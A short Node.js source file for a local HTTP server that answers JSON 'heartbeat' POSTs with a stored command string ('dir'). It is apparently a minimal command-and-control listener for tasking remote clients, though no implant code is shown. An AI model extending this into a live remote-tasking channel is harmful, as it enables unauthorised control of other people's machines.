const http = require('http')
const fs = require('fs')
const port = 3000
const host = '127.0.0.1'

const server = http.createServer(function(request, response) {
    response.setHeader('Access-Control-Allow-Origin', '*');
    response.setHeader('Access-Control-Allow-Methods', '*');
    response.setHeader('Access-Control-Allow-Headers', '*');

    if (request.method == 'POST') {
        console.log("Post Request Detected")
        var postMessage = ''
        request.on('data', function(data) {
            postMessage += data
        })

        request.on('end', function() {

            logData(postMessage)
            sendResponse(postMessage, response)

        })

    } else {
        response.writeHead(200, {
            'Content-Type': 'text/html'
        })
        fs.readFile('index.html', function(error, data) {
            if (error) {
                response.writeHead(404)
                response.write('Error: File Not Found')
            } else {
                response.write(data)
            }
            response.end()
        })
    }
})

var stored_cmd = "dir";

function sendResponse(postMessage, response) {
        console.log("Sending Response")
        msg = JSON.parse(postMessage)
        if (msg.type === 'heartbeat') {
          response.end(JSON.stringify(stored_cmd));
        } else {
          response.end(JSON.stringify("Response Message"));
          console.log("Response Sent")
        }
}


function logData(msg) {
    try {
        createLogDir()
        convertPostRequest(msg)
    } catch (err) {
        console.log("logData: ERROR: ", err)
    }
}


//Creating the log directories
function createLogDir() {
    log_dir = "./logs/"
    if (!fs.existsSync(log_dir)) {
        fs.mkdirSync(log_dir);
    }
}


function convertPostRequest(msg) {
    msg = JSON.parse(msg)
    console.log(msg.type)
    console.log(msg.data)
    
    if (msg.type == "heartbeat") {
      console.log("Heartbeat Detected")
    }


}

server.listen(port, host)
console.log("listening on ", host + ":" + port)